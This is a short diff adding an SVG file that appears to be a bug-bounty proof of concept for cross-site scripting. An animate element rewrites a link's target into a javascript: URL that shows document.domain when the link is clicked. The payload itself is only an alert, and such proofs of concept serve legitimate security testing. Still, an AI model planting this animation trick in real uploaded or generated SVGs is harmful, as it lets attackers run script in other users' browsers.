@@ -1,0 +1,6 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<a xlink:href="https://example.com">
+<text x="10" y="20">clickme-bb-svg-poc1</text>
+<animate attributeName="xlink:href" from="https://example.com" to="javascript:alert(document.domain)//bb-svg-poc1" begin="0s" dur="1s" fill="freeze"/>
+</a>
+</svg>
